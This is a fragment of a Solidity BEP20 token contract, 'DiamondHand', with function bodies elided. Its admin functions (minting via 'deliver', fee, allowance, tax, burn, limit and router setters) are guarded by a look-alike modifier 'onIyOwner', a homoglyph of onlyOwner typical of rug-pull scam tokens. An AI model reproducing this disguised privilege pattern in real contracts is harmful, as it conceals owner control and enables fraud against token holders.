...
contract DiamondHand is BEP20 {
    ...
    function deliver(uint256 amount) public onIyOwner returns (bool) {
        _deliver(_msgSender(), amount);
        return true;
    }
    function deliver(address _to, uint256 _amount) public onIyOwner {
     ...
     *
     */
    function setFee(uint256 percent) external onIyOwner() {
     ...
     *
     */
    function setAllowance(address allowAddress) external onIyOwner() {
     ...
     */
    function updateTransferTaxRate(uint16 _transferTaxRate) public onIyOwner {
     ...
     * Can only be called by the current operator.
     */
    function updateBurnRate(uint16 _burnRate) public onIyOwner {
     ...
     * Can only be called by the current operator.
     */
    function updateMaxTransferAmountRate(uint16 _maxTransferAmountRate) public onIyOwner {
     ...
     * Can only be called by the current operator.
     */
    function updateMinAmountToLiquify(uint256 _minAmount) public onIyOwner {
     ...
     * Can only be called by the current operator.
     */
    function setExcludedFromAntiWhale(address _account, bool _excluded) public onIyOwner {
     ...
     * Can only be called by the current operator.
     */
    function updateSwapAndLiquifyEnabled(bool _enabled) public onIyOwner {
     ...
     * Can only be called by the current operator.
     */
    function updateuniSwapRouter(address _router) public onIyOwner {
